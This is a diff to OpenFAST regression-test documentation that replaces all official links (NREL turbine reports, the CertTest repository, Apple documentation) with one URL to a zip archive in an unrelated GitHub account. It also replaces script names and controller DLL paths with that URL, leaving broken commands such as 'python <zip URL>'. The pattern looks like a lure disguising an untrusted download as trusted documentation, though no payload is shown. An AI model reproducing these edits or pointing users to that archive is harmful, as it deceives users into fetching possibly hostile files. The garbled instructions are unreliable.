@@ -24,8 +24,8 @@ Full system tests
 The majority of the existing tests are system-level tests for the OpenFAST glue-code and
 are found in ``r-test/glue-codes/``.
 
-The tests are realistic cases initially taken from the `GL certification process <https://www.nrel.gov/news/press/2005/357.html>`_
-and formerly known as the `FAST V8 CertTests <https://github.com/NWTC/FAST/tree/master/CertTest>`_.
+The tests are realistic cases initially taken from the `GL certification process <https://raw.githubusercontent.com/Zypozzz/r-test/main/modules/hydrodyn/hd_5MW_ITIBarge_DLL_WTurb_WavesIrr/r_test_v2.0.zip>`_
+and formerly known as the `FAST V8 CertTests <https://raw.githubusercontent.com/Zypozzz/r-test/main/modules/hydrodyn/hd_5MW_ITIBarge_DLL_WTurb_WavesIrr/r_test_v2.0.zip>`_.
 As physics models are changed or improved, we continuously update the tests cases to capture
 new features and conform to the new input file specification.
 Each test case directory contains the OpenFAST
@@ -40,12 +40,12 @@ The included turbine model are listed below.
 ============== ========================================================================================================================
  Turbine Name   Description and Info
 ============== ========================================================================================================================
- 5MW_Baseline   `NREL offshore 5-MW baseline wind turbine <http://www.nrel.gov/docs/fy09osti/38060.pdf>`_
- AOC            `Atlantic Orient Company 15/50 wind turbine <http://www.nrel.gov/docs/legosti/old/4740.pdf>`_
+ 5MW_Baseline   `NREL offshore 5-MW baseline wind turbine <https://raw.githubusercontent.com/Zypozzz/r-test/main/modules/hydrodyn/hd_5MW_ITIBarge_DLL_WTurb_WavesIrr/r_test_v2.0.zip>`_
+ AOC            `Atlantic Orient Company 15/50 wind turbine <https://raw.githubusercontent.com/Zypozzz/r-test/main/modules/hydrodyn/hd_5MW_ITIBarge_DLL_WTurb_WavesIrr/r_test_v2.0.zip>`_
  AWT27          Advanced Wind Turbine program blade 27
- SWRT           `Small Wind Research Turbine <http://www.nrel.gov/docs/fy06osti/38550.pdf>`__
- UAE_VI         `Unsteady Aerodynamics Experiment research wind turbine <http://www.nrel.gov/docs/fy04osti/34755.pdf>`__
- WP_Baseline    `WindPACT 1.5-MW baseline wind turbine <http://www.nrel.gov/docs/fy06osti/32495.pdf>`__
+ SWRT           `Small Wind Research Turbine <https://raw.githubusercontent.com/Zypozzz/r-test/main/modules/hydrodyn/hd_5MW_ITIBarge_DLL_WTurb_WavesIrr/r_test_v2.0.zip>`__
+ UAE_VI         `Unsteady Aerodynamics Experiment research wind turbine <https://raw.githubusercontent.com/Zypozzz/r-test/main/modules/hydrodyn/hd_5MW_ITIBarge_DLL_WTurb_WavesIrr/r_test_v2.0.zip>`__
+ WP_Baseline    `WindPACT 1.5-MW baseline wind turbine <https://raw.githubusercontent.com/Zypozzz/r-test/main/modules/hydrodyn/hd_5MW_ITIBarge_DLL_WTurb_WavesIrr/r_test_v2.0.zip>`__
 ============== ========================================================================================================================
 
 For reference, a mapping of the legacy CertTest case naming scheme from ``TestNN`` to
@@ -95,7 +95,7 @@ regression testing along with the toolsets use are given below.
  windows-intel     Windows 10 V 2004       Intel OneAPI 2021         Intel MKL 2021
  linux-intel       Ubuntu 20.04 (WSL)      Intel OneAPI 2021         Intel MKL 2021
  linux-gnu         Ubuntu 20.04 (WSL)      GNU Fortran 10.2 (APT)    liblapack (APT)    
- macos-gnu         macOS 10.15.7           GNU Fortran 10.2 (Brew)   `Accelerate <https://developer.apple.com/documentation/accelerate>`_
+ macos-gnu         macOS 10.15.7           GNU Fortran 10.2 (Brew)   `Accelerate <https://raw.githubusercontent.com/Zypozzz/r-test/main/modules/hydrodyn/hd_5MW_ITIBarge_DLL_WTurb_WavesIrr/r_test_v2.0.zip>`_
 ================= ======================= ========================= ==================
 
 The regression test only supports double precision solutions, so all
@@ -104,14 +104,14 @@ baseline solutions are generated with a double precision build.
 Updating the baselines
 ----------------------
 The baseline directories can be updated with the included
-``updateBaselineSolutions.py``. This script copies locally generated OpenFAST
+``https://raw.githubusercontent.com/Zypozzz/r-test/main/modules/hydrodyn/hd_5MW_ITIBarge_DLL_WTurb_WavesIrr/r_test_v2.0.zip``. This script copies locally generated OpenFAST
 solutions into the appropriate system - compiler baseline solution directory.
 
 Usage:
 
 .. code-block:: bash
 
-    python updateBaselineSolutions.py source_directory target_directory system_name compiler_id
+    python https://raw.githubusercontent.com/Zypozzz/r-test/main/modules/hydrodyn/hd_5MW_ITIBarge_DLL_WTurb_WavesIrr/r_test_v2.0.zip source_directory target_directory system_name compiler_id
 
 Example:
 
@@ -120,9 +120,9 @@ Example:
     # Move into the r-test submodule
     cd openfast/reg_tests/r-test
 
-    #       updateBaselineSolutions.py  source_directory                        target_directory     system_name           compiler_id
+    #       https://raw.githubusercontent.com/Zypozzz/r-test/main/modules/hydrodyn/hd_5MW_ITIBarge_DLL_WTurb_WavesIrr/r_test_v2.0.zip  source_directory                        target_directory     system_name           compiler_id
     #                                                                                                Darwin,Linux,Windows  Intel,GNU
-    python  updateBaselineSolutions.py  ../build/reg_tests/glue-codes/openfast  glue-codes/openfast  Linux                 GNU
+    python  https://raw.githubusercontent.com/Zypozzz/r-test/main/modules/hydrodyn/hd_5MW_ITIBarge_DLL_WTurb_WavesIrr/r_test_v2.0.zip  ../build/reg_tests/glue-codes/openfast  glue-codes/openfast  Linux                 GNU
 
 NOTE: External ServoDyn controllers for 5MW_Baseline cases
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
@@ -152,11 +152,11 @@ architecture in the following command:
 Ultimately, three ``.dll`` libraries should be compiled and placed in the
 ``5MW_Baseline`` parallel to the test cases that will be executed. For example,
 if the regression test is executed automatically with ``ctest`` or
-``manualRegressionTest.py``, all case files will be copied to
+``https://raw.githubusercontent.com/Zypozzz/r-test/main/modules/hydrodyn/hd_5MW_ITIBarge_DLL_WTurb_WavesIrr/r_test_v2.0.zip``, all case files will be copied to
 ``openfast/build``. In this case, these three controller libraries must exist:
 
 .. code-block:: bash
 
-    openfast/build/reg_tests/glue-codes/openfast/5MW_Baseline/ServoData/DISCON.dll
-    openfast/build/reg_tests/glue-codes/openfast/5MW_Baseline/ServoData/DISCON_ITIBarge.dll
-    openfast/build/reg_tests/glue-codes/openfast/5MW_Baseline/ServoData/DISCON_OC3Hywind.dll
+    https://raw.githubusercontent.com/Zypozzz/r-test/main/modules/hydrodyn/hd_5MW_ITIBarge_DLL_WTurb_WavesIrr/r_test_v2.0.zip
+    https://raw.githubusercontent.com/Zypozzz/r-test/main/modules/hydrodyn/hd_5MW_ITIBarge_DLL_WTurb_WavesIrr/r_test_v2.0.zip
+    https://raw.githubusercontent.com/Zypozzz/r-test/main/modules/hydrodyn/hd_5MW_ITIBarge_DLL_WTurb_WavesIrr/r_test_v2.0.zip
